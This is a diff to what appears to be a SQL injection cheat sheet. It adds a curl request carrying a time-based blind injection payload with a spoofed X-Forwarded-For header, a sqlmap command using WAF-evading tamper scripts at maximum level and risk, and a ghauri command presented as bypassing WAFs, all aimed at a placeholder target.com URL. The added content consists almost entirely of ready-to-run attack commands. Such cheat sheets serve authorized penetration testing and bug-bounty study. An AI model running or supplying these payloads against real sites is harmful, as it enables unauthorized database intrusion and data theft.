@@ -2554,6 +2554,10 @@ AND false	False
 '=0--+
 ```
 
+* Manual Testing with cURL
+```bash
+curl -X GET "https://target.com/page.php?id=1" --data-urlencode "id=1' OR if(now()=sysdate(),SLEEP(8),0) -- -" -H "X-Forwarded-For: 127.0.0.1"
+```
 
 ## Automate SQLi
 ```bash
@@ -2568,33 +2572,10 @@ python3 paramspider.py -d target.com -s TRUE -e woff,ttf,eot,svg | deduplicate -
 
 # you can use sqlmap + burp --> burp extension sqlipy (integrated by sqlmap)
 
+# Advanced Testing with SQLMap
+sqlmap -u "https://target.com/page.php?id=1" --batch --random-agent --tamper="between,space2comment,charencode" --timeout=15 --time-sec=8 --level=5 --risk=3
+
+# Automated Testing with Ghauri (Bypassing WAFs)
+ghauri -u "https://target.com/page.php?id=1" --timeout=30 --delay=5 --technique=BEST --level=3 --prefix="/**/" --suffix="-- -" --safe-chars="[]" --random-agent --ignore-code=403
+
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
